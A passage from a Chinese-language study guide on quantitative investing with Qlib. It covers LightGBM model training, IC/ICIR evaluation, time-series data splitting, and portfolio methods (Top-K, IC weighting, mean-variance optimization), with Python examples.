验证集开头空出几天，作为缓冲\n两者结合，更严格地防止信息泄露\n\n\n\nIC 和 MSE 哪个更重要？\n\nIC 更重要，因为量化只关心排序\nMSE 衡量精确度，不适合量化场景\nIC 能直接反映预测能力\n\n\n\n如何判断模型是否过拟合？\n\n训练集 IC 远高于验证集 IC\n使用早停机制\n增加正则化\n减少特征数量\n\n\n\n特征重要性分析的意义是什么？\n\n理解模型决策逻辑\n识别有效因子\n剔除冗余特征\n提升模型性能\n\n\n\n📚 推荐学习路径\n🟢 初学者路径\n1. 理解 Gradient Boosting 原理\n   ↓\n2. 学习时序数据划分\n   ↓\n3. 训练第一个 LightGBM 模型\n   ↓\n4. 计算 IC 和 ICIR\n   ↓\n5. 分析特征重要性\n\n🟡 进阶路径\n1. 掌握 IC 优化训练\n   ↓\n2. 学习在线学习\n   ↓\n3. 实现 Walk-Forward 验证\n   ↓\n4. 掌握高级评估方法\n   ↓\n5. 进行稳定性分析\n\n🔴 实战路径\n1. 从实际项目出发\n   ↓\n2. 遇到问题查文档\n   ↓\n3. 理论原理学习\n   ↓\n4. 实践应用\n   ↓\n5. 持续优化迭代\n\n🔧 工具箱\n必备 Python 库\nimport lightgbm as lgb  # LightGBM\nimport pandas as pd       # 数据处理\nimport numpy as np        # 数值计算\nfrom scipy.stats import pearsonr, spearmanr  # IC 计算\nimport matplotlib.pyplot as plt  # 可视化\nimport shap  # SHAP 解释\n常用代码片段\n1. 数据划分\ndef train_val_test_split(X, y, dates, train_ratio=0.7, val_ratio=0.15):\n    unique_dates = np.unique(dates)\n    n_dates = len(unique_dates)\n    train_end_idx = int(n_dates * train_ratio)\n    val_end_idx = int(n_dates * (train_ratio + val_ratio))\n \n    train_mask = dates &lt;= unique_dates[train_end_idx]\n    valid_mask = (dates &gt; unique_dates[train_end_idx]) &amp; (dates &lt;= unique_dates[val_end_idx])\n    test_mask = dates &gt; unique_dates[val_end_idx]\n \n    return (X[train_mask], X[valid_mask], X[test_mask]), (y[train_mask], y[valid_mask], y[test_mask])\n2. 模型训练\ndef train_lightgbm(X_train, y_train, X_valid, y_valid, params):\n    train_data = lgb.Dataset(X_train, label=y_train)\n    valid_data = lgb.Dataset(X_valid, label=y_valid, reference=train_data)\n \n    model = lgb.train(\n        params,\n        train_data,\n        num_boost_round=500,\n        valid_sets=[train_data, valid_data],\n        callbacks=[\n            lgb.early_stopping(stopping_rounds=30),\n            lgb.log_evaluation(period=50)\n        ]\n    )\n \n    return model\n3. IC 评估\ndef evaluate_ic(y_pred, y_true):\n    ic, _ = pearsonr(y_pred, y_true)\n    rank_ic, _ = spearmanr(y_pred, y_true)\n    return ic, rank_ic\n4. 特征重要性\ndef get_feature_importance(model, feature_names, importance_type=&#039;gain&#039;):\n    importance = model.feature_importance(importance_type=importance_type)\n    importance_df = pd.DataFrame({\n        &#039;feature&#039;: feature_names,\n        &#039;importance&#039;: importance\n    }).sort_values(&#039;importance&#039;, ascending=False)\n    return importance_df\n🚀 下一步学习\n完成 Week 3 后，你已经掌握了：\n✅ Gradient Boosting 原理\n✅ 时序数据正确划分\n✅ LightGBM 模型训练\n✅ 量化模型评估 (IC/ICIR)\n✅ 特征重要性分析与选择\n下一步：Week 4 - 策略回测\n你将学习：\n\n交易策略原理 (Top-K、等权重、IC加权)\n投资组合构建方法\n回测框架使用\n风险指标计算 (夏普比率、最大回撤等)\n\n\n祝学习顺利！ 🎉"},"quant/qlib/week2/index":{"slug":"quant/qlib/week2/index","filePath":"quant/qlib/week2/index.md","title":"index","links":["quant/qlib/week2/01-Gradient-Boosting原理","quant/qlib/week2/02-时序数据划分","quant/qlib/week2/03-模型训练","quant/qlib/week2/04-IC-Rank-IC评估指标","quant/qlib/week2/05-特征重要性分析","/"],"tags":[],"content":"LightGBM 量化投资应用指南\nLightGBM 是微软开源的高性能梯度提升框架，在量化投资领域有着广泛的应用。本文档系统讲解了 LightGBM 在量化场景下的应用方法。\n\n📖 文档目录\n1️⃣ Gradient Boosting 原理\n→ 阅读完整文档\n核心内容：\n\nBoosting算法基础与数学推导\nLightGBM三大创新：GOSS、EFB、Leaf-wise\n量化场景下的优势分析\n核心参数详解\n\n适合人群：想要深入理解LightGBM原理的开发者\n\n2️⃣ 时序数据划分\n→ 阅读完整文档\n核心内容：\n\n量化时序数据的因果性约束\n时间序列交叉验证（TimeSeriesSplit）\n滚动窗口验证与步进验证\n多市场周期的数据划分策略\n\n适合人群：需要处理时序数据的量化开发者\n\n3️⃣ 模型训练\n→ 阅读完整文档\n核心内容：\n\nLightGBM基础训练流程\n针对IC优化的训练策略\n在线学习（Online Learning）\n学习率调度与特征采样\n分布式训练与模型管理\n\n适合人群：需要构建量化模型的开发者\n\n4️⃣ IC/Rank IC 评估指标\n→ 阅读完整文档\n核心内容：\n\nIC与Rank IC的定义与区别\nIC的统计显著性检验\n滚动IC与IC衰减分析\nIR（Information Ratio）指标\n多维度IC表现分析\n\n适合人群：需要评估模型性能的量化研究者\n\n5️⃣ 特征重要性分析\n→ 阅读完整文档\n核心内容：\n\nSplit与Gain特征重要性\nPermutation Importance实现\nSHAP值分析与应用\n时序特征重要性分析\n稳定性特征选择策略\n\n适合人群：需要进行特征工程的开发者\n\n🎯 学习路径\n🟢 初学者路径\n梯度提升原理 → 时序数据划分 → 模型训练基础 → IC评估 → 特征重要性\n\n🟡 进阶路径\nIC优化训练 → 在线学习 → 分布式训练 → 高级评估方法 → 稳定性分析\n\n🔴 实战路径\n从实际项目出发 → 遇到问题查文档 → 理论原理 → 实践应用\n\n\n💡 实用提示\n\n文档示例：所有代码示例均可直接运行\n量化场景：内容针对量化投资特点设计\n最佳实践：包含大量实战经验总结\n持续更新：跟随最新技术发展\n\n🔍 最佳实践\n时序划分\n# ✅ 正确做法\ndates = X.index.get_level_values(0)\nunique_dates = dates.unique().sort_values()\ntrain_mask = dates &lt;= unique_dates[int(n_dates * 0.7)]\nvalid_mask = (dates &gt; unique_dates[int(n_dates * 0.7)]) &amp; (dates &lt;= unique_dates[int(n_dates * 0.85)])\ntest_mask = dates &gt; unique_dates[int(n_dates * 0.85)]\n \n# ❌ 错误做法\nfrom sklearn.model_selection import train_test_split\nX_train, X_test = train_test_split(X, test_size=0.3)  # 数据泄露!\n模型训练\n# ✅ 推荐做法\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=500,\n    valid_sets=[train_data, valid_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=30),  # 使用早停\n        lgb.log_evaluation(period=50)\n    ]\n)\n \n# ⚠️ 不推荐做法\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=100,  # 固定轮数，可能过拟合或欠拟合\n    valid_sets=[train_data, valid_data],\n)\n模型评估\n# ✅ 推荐做法 - 使用 IC/ICIR\nmetrics = calculate_ic_metrics(pred_df, true_df)\nprint(f&quot;IC: {metrics[&#039;IC_mean&#039;]:.4f}&quot;)\nprint(f&quot;ICIR: {metrics[&#039;ICIR&#039;]:.4f}&quot;)\n \n# ⚠️ 不推荐做法 - 只看 MSE\nmse = mean_squared_error(y_true, y_pred)\nprint(f&quot;MSE: {mse:.6f}&quot;)  # 不能反映排序能力\n特征选择\n# ✅ 推荐做法 - 结合重要性和相关性\nselected = select_features_by_threshold(importance_df, threshold=0.2)\nhigh_corr = analyze_feature_correlation(X, selected, threshold=0.9)\n# 手动去除冗余特征\n \n# ⚠️ 不推荐做法 - 只看重要性，不考虑相关性\nselected = importance_df.head(10)[&#039;feature&#039;].tolist()  # 可能包含高度相关的特征\n❓ 常见问题\nQ1: 为什么要用 IC 而不是 MSE？\nA: 量化投资只关心排序，不关心预测值的绝对准确性。\n示例：\n股票   预测收益   真实收益   MSE   IC\nA      0.05       0.06      ...   ✓ 排序正确\nB      0.04       0.04      ...   ✓ 排序正确\nC      0.03       0.02      ...   ✓ 排序正确\n\n模型1: 预测 [0.05, 0.04, 0.03]\n模型2: 预测 [0.50, 0.40, 0.30]\n\n→ 两种预测的 MSE 不同，但排序相同\n→ IC 相同，IC 均能反映预测质量\n\nQ2: 早停轮数如何选择？\nA: 一般选择 20-50，取决于：\n\n数据量大小：大数据可以用更大的轮数\n学习率：小学习率需要更多轮数\n稳定性要求：高风险场景用更保守的轮数\n\n推荐：\nlgb.early_stopping(stopping_rounds=30)  # 常用默认值\nQ3: 如何防止过拟合？\nA: 多种方法组合使用：\n\n\n早停机制\nlgb.early_stopping(stopping_rounds=30)\n\n\n正则化\nparams = {\n    &#039;lambda_l1&#039;: 0.1,  # L1 正则\n    &#039;lambda_l2&#039;: 0.1,  # L2 正则\n}\n\n\n采样\nparams = {\n    &#039;feature_fraction&#039;: 0.8,  # 特征采样\n    &#039;bagging_fraction&#039;: 0.8,  # 样本采样\n}\n\n\n交叉验证\n\n使用 Walk-Forward 验证\n多个窗口测试稳定性\n\n\n\nQ4: IC 和 Rank IC 哪个更好？\nA: Rank IC 更稳定。\n原因：\n\n抗极端值\n不受异常值影响\n更适合量化场景\n\n推荐：\n# 主要看 Rank IC\nprint(f&quot;Rank IC: {rank_ic:.4f}&quot;)\n \n# IC 作为参考\nprint(f&quot;IC: {ic:.4f}&quot;)\nQ5: 特征重要性下降该怎么办？\nA: 分情况处理：\n\n\n重要性普遍低 (&lt; 5)\n\n可能特征质量差\n需要重新构造特征\n\n\n\n某些特征重要性低\n\n可能与其他特征相关\n检查特征相关性\n考虑剔除冗余特征\n\n\n\n重要性随时间变化\n\n可能市场环境变化\n考虑滚动窗口训练\n\n\n\nQ6: 模型 IC 算好吗？\nA: 参考以下标准：\nIC &gt; 0.10: 🌟 顶级 (非常罕见)\nIC &gt; 0.05: ✅ 优秀\nIC &gt; 0.03: ✅ 有效\nIC &gt; 0.02: ⚠️ 一般\nIC &lt; 0.02: ❌ 较弱\n\n注意：\n\n测试集 IC 可能比验证集低 20-30%\n实盘 IC 可能比回测低 30-50%\n需要结合 ICIR 判断稳定性\n\n\n← 返回首页"},"quant/qlib/week3/01-交易策略理论":{"slug":"quant/qlib/week3/01-交易策略理论","filePath":"quant/qlib/week3/01-交易策略理论.md","title":"01-交易策略理论","links":[],"tags":[],"content":"交易策略理论\n1. 交易策略定义\n1.1 策略的核心组成\n交易策略 = 信号生成 + 仓位管理 + 风险控制 + 执行规则\n市场数据 → 特征工程 → 模型预测 → 信号生成\n                            ↓\n                        投资组合构建 → 交易执行 → 绩效评估\n\n1.2 四个关键组成部分\n1. 信号生成\n定义：决定买什么、卖什么\n常见方法：\n\nTop-K 策略：选择预测最好的 K 只股票\n回归预测：预测每只股票的收益率\n分类预测：预测股票的涨跌\n\n输出：股票选择或买卖信号\ndef generate_signals(predictions, method=&#039;topk&#039;, k=20):\n    &quot;&quot;&quot;\n    生成交易信号\n    \n    参数:\n        predictions: 股票预测分数\n        method: 策略方法 (&#039;topk&#039;, &#039;regression&#039;, &#039;classification&#039;)\n        k: 选择股票数量（Top-K策略）\n    \n    返回:\n        signals: 交易信号\n    &quot;&quot;&quot;\n    if method == &#039;topk&#039;:\n        # 选择预测分数最高的K只股票\n        topk = predictions.nlargest(k)\n        signals = (predictions &gt;= topk.min()).astype(int)\n    elif method == &#039;regression&#039;:\n        # 使用回归预测值作为信号\n        signals = predictions\n    elif method == &#039;classification&#039;:\n        # 使用分类预测结果（1=买入, -1=卖出）\n        signals = predictions\n    \n    return signals\n2. 仓位管理\n定义：决定买多少、卖多少\n常见方法：\n\n等权重：每只股票分配相同资金\nIC加权：根据历史IC值分配权重\n风险平价：等风险贡献\nMV优化：均值-方差优化\n\n输出：每只股票的权重分配\n3. 风险控制\n定义：限制投资风险\n常见方法：\n\n最大单股权重限制\n行业分散要求\n止损策略\n风险平价\n\n输出：仓位调整或平仓信号\n4. 执行规则\n定义：何时调仓、如何执行\n常见方法：\n\n定期调仓：每日、每周、每月调仓\n触发调仓：达到某个条件时调仓\n\n输出：交易指令\n\n2. 量化投资基础概念\n2.1 信息系数（IC）\n定义：预测分数与实际收益的秩相关系数\n计算公式：\nIC = RankCorrelation(预测分数, 实际收益)\n\nPython 实现：\nfrom scipy.stats import spearmanr\n \ndef calculate_ic(predictions, returns):\n    &quot;&quot;&quot;\n    计算 IC（信息系数）\n    \n    参数:\n        predictions: 预测分数\n        returns: 实际收益率\n    \n    返回:\n        ic: IC 值\n    &quot;&quot;&quot;\n    ic, _ = spearmanr(predictions, returns)\n    return ic\n \n# 示例\npredictions = pd.Series([0.05, 0.03, 0.01, -0.02, -0.05])\nreturns = pd.Series([0.06, 0.04, 0.02, -0.01, -0.04])\n \nic = calculate_ic(predictions, returns)\nprint(f&quot;IC = {ic:.4f}&quot;)\nIC 含义：\n\nIC &gt; 0.05：模型有一定预测能力\nIC &gt; 0.1：模型预测能力较强\nIC &lt; 0：预测方向错误\n\nICIR（信息比率）：\nICIR = mean(IC) / std(IC)\n\ndef calculate_icir(ic_series):\n    &quot;&quot;&quot;\n    计算 ICIR（信息比率）\n    \n    参数:\n        ic_series: IC 序列\n    \n    返回:\n        icir: ICIR 值\n    &quot;&quot;&quot;\n    icir = ic_series.mean() / ic_series.std()\n    return icir\n2.2 换手率\n定义：衡量交易活跃程度的指标\n计算公式：\n换手率 = 交易额 / 平均资产\n\nPython 实现：\ndef calculate_turnover(portfolio_changes, avg_value):\n    &quot;&quot;&quot;\n    计算换手率\n    \n    参数:\n        portfolio_changes: 持仓变化（绝对值）\n        avg_value: 平均资产价值\n    \n    返回:\n        turnover: 换手率\n    &quot;&quot;&quot;\n    turnover = portfolio_changes.abs().sum() / avg_value\n    return turnover\n \n# 示例\n# 假设某日持仓变化\nportfolio_changes = pd.Series({\n    &#039;600000&#039;: 100000,   # 买入10万\n    &#039;600001&#039;: -50000,   # 卖出5万\n    &#039;600002&#039;: 80000,    # 买入8万\n})\n \navg_value = 1000000  # 平均资产100万\nturnover = calculate_turnover(portfolio_changes, avg_value)\nprint(f&quot;换手率 = {turnover:.2%}&quot;)\n换手率含义：\n\n高换手率：交易频繁，成本高\n低换手率：交易少，成本低\n过高换手可能损害收益\n\n换手率范围：\n\n低频策略：50%-100%\n中频策略：100%-300%\n高频策略：300%-1000%\n\n2.3 回撤\n定义：从历史最高点到当前点的跌幅\n计算公式：\n回撤 = (当前净值 - 历史最高净值) / 历史最高净值\n\n最大回撤：\n最大回撤 = min(回撤)  # 回撤的最小值\n\nPython 实现：\ndef calculate_drawdown(cumulative_returns):\n    &quot;&quot;&quot;\n    计算回撤\n    \n    参数:\n        cumulative_returns: 累计收益率序列\n    \n    返回:\n        drawdown: 回撤序列\n        max_drawdown: 最大回撤\n    &quot;&quot;&quot;\n    # 计算累计净值\n    cumulative_value = (1 + cumulative_returns).cumprod()\n    \n    # 计算历史最高点\n    running_max = cumulative_value.expanding().max()\n    \n    # 计算回撤\n    drawdown = (cumulative_value - running_max) / running_max\n    \n    # 最大回撤\n    max_drawdown = drawdown.min()\n    \n    return drawdown, max_drawdown\n \n# 示例\nreturns = pd.Series([0.01, 0.02, -0.01, 0.03, -0.02, 0.01, -0.03])\ndrawdown, max_drawdown = calculate_drawdown(returns)\n \nprint(f&quot;最大回撤 = {max_drawdown:.2%}&quot;)\nprint(f&quot;当前回撤 = {drawdown.iloc[-1]:.2%}&quot;)\n\n3. Top-K 策略\n3.1 核心思想\n\n对所有股票的预测分数排序\n选择预测最好的 K 只股票\n按某种权重分配资金（通常等权重）\n定期调仓\n\n3.2 算法步骤\ndef top_k_strategy(predictions, k=20):\n    &quot;&quot;&quot;\n    Top-K 投资组合策略\n    \n    参数:\n        predictions: 股票预测分数\n        k: 选择股票数量\n    \n    返回:\n        weights: 股票权重，权重和为1\n    &quot;&quot;&quot;\n    # 1. 按预测分数排序（降序）\n    sorted_predictions = predictions.sort_values(ascending=False)\n    \n    # 2. 选择 Top-K\n    top_k = sorted_predictions[:k]\n    \n    # 3. 计算等权重\n    weight = 1.0 / k\n    \n    # 4. 分配权重\n    weights = pd.Series(0, index=predictions.index)\n    weights[top_k.index] = weight\n    \n    return weights\n \n# 示例\npredictions = pd.Series({\n    &#039;600000&#039;: 0.025,\n    &#039;600001&#039;: 0.023,\n    &#039;600002&#039;: 0.010,\n    &#039;600003&#039;: 0.009,\n    &#039;600004&#039;: -0.015,\n})\n \nweights = top_k_strategy(predictions, k=3)\nprint(&quot;Top-K 权重分配:&quot;)\nprint(weights)\n示例输出：\nTop-K 权重分配:\n600000    0.333333\n600001    0.333333\n600002    0.333333\n600003    0.000000\n600004    0.000000\ndtype: float64\n\n3.3 优势与风险\n优势：\n\n✅ 简单直观，易于实现\n✅ 集中投资在最有把握的股票\n✅ 自动分散风险（持有多只股票）\n✅ 管理成本低，易于维护\n\n风险：\n\n⚠️ 对预测质量敏感\n⚠️ 可能集中投资相似股票\n⚠️ 换手率可能较高\n⚠️ 没有考虑风险和相关性\n\n3.4 参数选择\nK 值的影响：\n\nK 小（如10）：集中度高，风险大，潜在收益高\nK 大（如50）：分散度高，风险低，收益可能降低\nK = 全市场：等权重市场组合，接近指数投资\n\n实践建议：\n\nK 通常选择 20-50 之间\n根据流动性调整 K 值\n考虑市场环境调整 K 值\n\n\n4. IC 权重策略\n4.1 核心思想\n根据历史 IC 值分配权重，预测能力强的股票获得更高权重\n4.2 IC 计算方法\n单期 IC：\nIC_t = RankCorrelation(预测分数_t, 实际收益_t)\n滚动 IC：\n# 计算过去 N 期的平均 IC\nIC_rolling = mean(IC_{t-N+1}, ..., IC_t)\nPython 实现：\ndef calculate_rolling_ic(predictions, returns, window=20):\n    &quot;&quot;&quot;\n    计算滚动 IC\n    \n    参数:\n        predictions: 预测分数 DataFrame (index: date, columns: stock)\n        returns: 实际收益率 DataFrame (index: date, columns: stock)\n        window: 滚动窗口大小\n    \n    返回:\n        rolling_ic: 滚动 IC DataFrame\n    &quot;&quot;&quot;\n    rolling_ic = pd.DataFrame(index=predictions.index, columns=predictions.columns)\n    \n    for stock in predictions.columns:\n        for date in predictions.index[window:]:\n            # 获取窗口期数据\n            pred_window = predictions.loc[date - window + 1: date, stock]\n            ret_window = returns.loc[date - window + 1: date, stock]\n            \n            # 计算 IC\n            ic, _ = spearmanr(pred_window, ret_window)\n            rolling_ic.loc[date, stock] = ic\n    \n    return rolling_ic\n4.3 权重分配方法\n方法 1：直接 IC 权重\ndef ic_weight_direct(rolling_ic, min_ic=0.02):\n    &quot;&quot;&quot;\n    直接 IC 权重分配\n    \n    参数:\n        rolling_ic: 滚动 IC\n        min_ic: 最小 IC 阈值\n    \n    返回:\n        weights: 股票权重\n    &quot;&quot;&quot;\n    # 只选择 IC &gt; min_ic 的股票\n    valid_stocks = rolling_ic[rolling_ic &gt; min_ic]\n    \n    # 根据 IC 分配权重\n    weights = valid_stocks / valid_stocks.sum()\n    \n    return weights\n方法 2：IC 绝对值权重\ndef ic_weight_absolute(rolling_ic, min_ic=0.02):\n    &quot;&quot;&quot;\n    IC 绝对值权重分配\n    \n    参数:\n        rolling_ic: 滚动 IC\n        min_ic: 最小 IC 阈值\n    \n    返回:\n        weights: 股票权重\n    &quot;&quot;&quot;\n    # 取 IC 的绝对值\n    abs_ic = rolling_ic.abs()\n    \n    # 只选择 IC &gt; min_ic 的股票\n    valid_stocks = abs_ic[abs_ic &gt; min_ic]\n    \n    # 根据 IC 绝对值分配权重\n    weights = valid_stocks / valid_stocks.sum()\n    \n    return weights\n方法 3：平滑 IC 权重\ndef ic_weight_smooth(rolling_ic, min_ic=0.02, alpha=1.0):\n    &quot;&quot;&quot;\n    平滑 IC 权重分配（softmax）\n    \n    参数:\n        rolling_ic: 滚动 IC\n        min_ic: 最小 IC 阈值\n        alpha: 平滑系数\n    \n    返回:\n        weights: 股票权重\n    &quot;&quot;&quot;\n    # 只选择 IC &gt; min_ic 的股票\n    valid_stocks = rolling_ic[rolling_ic &gt; min_ic]\n    \n    # Softmax 归一化\n    weights = np.exp(alpha * valid_stocks) / np.sum(np.exp(alpha * valid_stocks))\n    \n    return weights\n4.4 优势与风险\n优势：\n\n✅ 考虑预测能力差异\n✅ 动态调整权重\n✅ 对历史表现好的股票给予更高权重\n\n风险：\n\n⚠️ 需要足够历史数据\n⚠️ IC 可能不稳定\n⚠️ 换手率可能较高\n⚠️ 过度拟合历史数据\n\n4.5 实践建议\n\n使用滚动窗口计算 IC（如 20 期）\n设置最小 IC 阈值\n对 IC 进行平滑处理\n限制单股权重最大值\n\n\n5. 均值-方差优化（MVO）\n5.1 理论基础\n马科维茨现代投资组合理论：在给定风险水平下最大化收益\n5.2 数学模型\n优化问题：\nmax: μ^T w - λ w^T Σ w\n\ns.t.:\n    Σw_i = 1        (权重和为1)\n    w_i ≥ 0         (不允许做空)\n    w_i ≤ w_max     (最大单股权重)\n\n变量说明：\n\nw：权重向量\nμ：期望收益向量\nΣ：协方差矩阵\nλ：风险厌恶系数\n\n5.3 有效前沿\n定义：在不同风险水平下获得最大期望收益的投资组合集合\n意义：\n\n有效前沿上的组合都是最优的\n投资者根据风险偏好选择组合\n有效前沿是凸的\n\n5.4 参数估计\n期望收益估计：\nmu = returns.mean()\n协方差矩阵估计：\nsigma = returns.cov()\n正则化（防止过拟合）：\nsigma_reg = sigma + lambda_reg * np.eye(len(returns.columns))\n5.5 CVXPY 求解\nimport cvxpy as cp\n \ndef mv_optimization(returns, risk_aversion=1.0, max_weight=0.1):\n    &quot;&quot;&quot;\n    均值-方差优化\n    \n    参数:\n        returns: 历史收益率\n        risk_aversion: 风险厌恶系数\n        max_weight: 最大单股权重\n    \n    返回:\n        weights: 最优权重\n    &quot;&quot;&quot;\n    n = len(returns.columns)\n    \n    # 定义变量\n    w = cp.Variable(n)\n    \n    # 定义参数\n    mu = returns.mean().values\n    sigma = returns.cov().values\n    \n    # 正则化\n    sigma_reg = sigma + 1e-6 * np.eye(n)\n    \n    # 定义目标函数\n    objective = cp.Maximize(mu @ w - risk_aversion * cp.quad_form(w, sigma_reg))\n    \n    # 定义约束\n    constraints = [\n        cp.sum(w) == 1,  # 权重和为1\n        w &gt;= 0,         # 不允许做空\n        w &lt;= max_weight # 最大单股权重\n    ]\n    \n    # 求解\n    problem = cp.Problem(objective, constraints)\n    problem.solve()\n    \n    # 获取解\n    optimal_weights = pd.Series(w.value, index=returns.columns)\n    \n    return optimal_weights\n \n# 示例\nimport numpy as np\nimport pandas as pd\n \n# 生成示例数据\nnp.random.seed(42)\nn_stocks = 10\nn_days = 252\nstocks = [f&#039;stock_{i}&#039; for i in range(n_stocks)]\ndates = pd.date_range(&#039;2020-01-01&#039;, periods=n_days, freq=&#039;D&#039;)\n \nreturns = pd.DataFrame(np.random.randn(n_days, n_stocks) * 0.02, \n                      index=dates, columns=stocks)\n \n# MV 优化\nweights = mv_optimization(returns, risk_aversion=1.0, max_weight=0.2)\n \nprint(&quot;MV 优化权重:&quot;)\nprint(weights)\n5.6 优势与风险\n优势：\n\n✅ 理论基础扎实（诺贝尔奖理论）\n✅ 考虑风险和相关性\n✅ 科学化资产配置\n✅ 可以量化风险\n\n风险：\n\n⚠️ 依赖参数估计（μ 和 Σ）\n⚠️ 估计误差影响大\n⚠️ 可能集中投资少数股票\n⚠️ 对异常值敏感\n\n5.7 实践建议\n\n使用稳健的估计方法\n对协方差矩阵进行正则化\n添加约束条件（行业、流动性等）\n定期重新估计参数\n\n\n6. 三种方法对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度Top-K 等权IC 权重MV 优化复杂度低中高数据需求低中高理论支撑经验统计理论计算速度快中慢换手率中高中风险控制弱中强适合新手✅⚠️❌\n\n7. 实践建议\n7.1 策略选择原则\n新手建议：\n\n从 Top-K 策权开始\n使用较小的 K 值（20-30）\n定期调仓（周频或月频）\n严格风险控制\n\n进阶建议：\n\n尝试 IC 权重策略\n学习 MV 优化方法\n进行参数敏感性分析\n做样本外验证\n\n7.2 风险控制建议\n\n\n分散化\n\n持有多只股票（至少 10 只）\n考虑行业分散\n避免过度集中\n\n\n\n仓位控制\n\n限制单股权重（&lt; 20%）\n限制行业权重（&lt; 30%）\n设置止损机制\n\n\n\n成本控制\n\n控制换手率（&lt; 300%）\n使用低佣金券商\n选择高流动性股票\n\n\n\n7.3 参数优化建议\n\n\n避免过拟合\n\n使用样本外验证\n限制参数数量\n参数有经济学含义\n\n\n\n参数稳定性\n\n在不同时间段表现稳定\n对数据变化不过敏\n定期重新评估参数\n\n\n\n\n总结\n交易策略的核心是：\n\n信号生成：选择股票\n仓位管理：分配权重\n风险控制：限制风险\n执行规则：何时调仓\n\n三种主要方法：\n\nTop-K 等权：简单可靠，适合新手\nIC 权重：动态调整，适合有历史数据\nMV 优化：科学配置，适合追求风险调整后收益\n\n建议从简单的 Top-K 策略开始，逐步学习更复杂的方法。"},"quant/qlib/week3/02-投资组合构建方法":{"slug":"quant/qlib/week3/02-投资组合构建方法","filePath":"quant/qlib/week3/02-投资组合构建方法.md","title":"02-投资组合构建方法","links":[],"tags":[],"content":"投资组合构建方法\n1. Top-K 均等权重\n1.1 算法步骤\ndef top_k_equal_weight(predictions, k=20):\n    &quot;&quot;&quot;\n    Top-K 均等权重策略\n    \n    参数:\n        predictions: 股票预测分数\n        k: 选择股票数量\n    \n    返回:\n        weights: 股票权重，权重和为1\n    &quot;&quot;&quot;\n    # 1. 按预测分数排序\n    sorted_stocks = predictions.sort_values(ascending=False)\n    \n    # 2. 选择 Top-K\n    top_k = sorted_stocks[:k]\n    \n    # 3. 计算等权重\n    weight = 1.0 / k\n    \n    # 4. 分配权重\n    weights = pd.Series(0, index=predictions.index)\n    weights[top_k.index] = weight\n    \n    return weights\n \n# 示例\npredictions = pd.Series({\n    &#039;600000&#039;: 0.025,\n    &#039;600001&#039;: 0.023,\n    &#039;600002&#039;: 0.010,\n    &#039;600003&#039;: 0.009,\n    &#039;600004&#039;: -0.015,\n    &#039;600005&#039;: -0.020,\n})\n \nweights = top_k_equal_weight(predictions, k=3)\nprint(&quot;Top-K 权重分配:&quot;)\nprint(weights)\n输出：\nTop-K 权重分配:\n600000    0.333333\n600001    0.333333\n600002    0.333333\n600003    0.000000\n600004    0.000000\n600005    0.000000\ndtype: float64\n\n1.2 关键参数\nk（选择股票数量）\n\n推荐范围：20-50\n小 k（10）：集中度高，风险大，潜在收益高\n大 k（50）：分散度高，风险低，收益可能降低\nk = 全市场：等权重市场组合，接近指数投资\n\n调仓频率\n\n日频：每天调仓，成本高，反应及时\n周频：每周调仓，平衡成本和及时性\n月频：每月调仓，成本低，反应滞后\n\n权重方式\n\n等权重：简单，适合新手\n按分数加权：考虑预测差异，但增加复杂度\n\n1.3 适用场景\n\n✅ 预测质量高且稳定\n✅ 追求简单策略\n✅ 流动性要求高\n✅ 交易成本敏感\n✅ 新手入门\n\n1.4 参数敏感性分析\ndef analyze_k_sensitivity(predictions, k_values=[10, 20, 30, 40, 50]):\n    &quot;&quot;&quot;\n    分析 K 值敏感性\n    \n    参数:\n        predictions: 股票预测分数\n        k_values: K 值列表\n    \n    返回:\n        results: 不同 K 值的结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for k in k_values:\n        weights = top_k_equal_weight(predictions, k=k)\n        \n        # 计算指标\n        n_selected = (weights &gt; 0).sum()\n        avg_weight = weights[weights &gt; 0].mean()\n        max_weight = weights.max()\n        \n        results.append({\n            &#039;k&#039;: k,\n            &#039;n_selected&#039;: n_selected,\n            &#039;avg_weight&#039;: avg_weight,\n            &#039;max_weight&#039;: max_weight\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nsensitivity_results = analyze_k_sensitivity(predictions)\nprint(&quot;K 值敏感性分析:&quot;)\nprint(sensitivity_results)\n\n2. IC 权重分配\n2.1 算法步骤\ndef ic_weight_strategy(predictions, ic_history, window=20, min_ic=0.02):\n    &quot;&quot;&quot;\n    IC 权重策略\n    \n    参数:\n        predictions: 股票预测分数\n        ic_history: IC 历史数据\n        window: IC 计算窗口\n        min_ic: 最小 IC 阈值\n    \n    返回:\n        weights: 股票权重，权重和为1\n    &quot;&quot;&quot;\n    # 1. 计算滚动 IC\n    rolling_ic = ic_history.rolling(window=window).mean()\n    \n    # 2. 只选择 IC &gt; 0 的股票\n    valid_stocks = rolling_ic[rolling_ic &gt; min_ic]\n    \n    # 3. 根据 IC 分配权重\n    if len(valid_stocks) == 0:\n        # 如果没有符合条件的股票，使用等权重\n        weights = pd.Series(1.0 / len(predictions), index=predictions.index)\n    else:\n        weights = valid_stocks / valid_stocks.sum()\n    \n    # 4. 填充未选中的股票\n    final_weights = pd.Series(0, index=predictions.index)\n    final_weights[weights.index] = weights\n    \n    return final_weights\n \n# 示例\nic_history = pd.DataFrame({\n    &#039;600000&#039;: [0.03, 0.04, 0.05, 0.04, 0.06],\n    &#039;600001&#039;: [0.02, 0.03, 0.02, 0.03, 0.02],\n    &#039;600002&#039;: [0.01, 0.01, 0.02, 0.01, 0.01],\n    &#039;600003&#039;: [0.00, 0.01, 0.00, 0.01, 0.00],\n    &#039;600004&#039;: [-0.01, -0.02, -0.01, -0.02, -0.01],\n})\n \nweights = ic_weight_strategy(predictions, ic_history, window=5, min_ic=0.02)\nprint(&quot;IC 权重分配:&quot;)\nprint(weights)\n2.2 关键参数\nwindow（IC 计算窗口）\n\n推荐范围：20-60\n窗口小：反应快，但不稳定\n窗口大：反应慢，但更稳定\n\nmin_ic（最小 IC 阈值）\n\n推荐范围：0.02-0.05\n阈值高：选股更严格，可能仓位不足\n阈值低：选股宽松，可能包含低质量股票\n\nsmooth_factor（IC 平滑系数）\n\n推荐范围：0.5-2.0\n用于平滑 IC 